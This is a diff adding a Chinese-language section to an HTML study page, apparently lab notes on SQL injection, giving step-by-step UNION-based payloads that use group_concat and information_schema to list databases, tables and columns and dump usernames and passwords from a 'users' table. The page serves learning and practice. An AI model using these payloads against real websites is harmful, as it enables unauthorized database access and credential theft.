@@ -453,6 +453,31 @@
 <p>而每个information_schema表里都有information_schema.tables字段</p>
 <p>table_schema  库名</p>
 <p>schema_name 表名</p>
+<h1 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h1><ul>
+<li><p>1.输入’1等字符看报错判断闭合方式</p>
+</li>
+<li><p>2.利用order by 判断列数</p>
+</li>
+<li><p>3.将数字改为-1并结合union联合查询1,2,3看一下哪列可以回显</p>
+</li>
+<li><p>4.哪列可以回显就利用哪列写group_concat()</p>
+</li>
+<li><p>5.爆库名：?id=-1‘ union select 1,group_concat(schema_name),3</p>
+</li>
+</ul>
+<p>from information_schema.schemata –+</p>
+<ul>
+<li>6.爆表名：?id=-1‘ union select 1,group_concat(table_name),3</li>
+</ul>
+<p>from information_schema.tables where table_schema=’security’ –+</p>
+<ul>
+<li>7.爆列名：?id=-1‘ union select 1,group_concat(column_name),3</li>
+</ul>
+<p>from information_schema.columns where table_name=’users’ –+</p>
+<ul>
+<li>8.爆数据：?id=-1‘ union select 1,group_concat(username,’~’,password),3</li>
+</ul>
+<p>from users –+     (或者：?id=-1‘ union select 1,username,password from users where id=1 –+)</p>
 
     
     
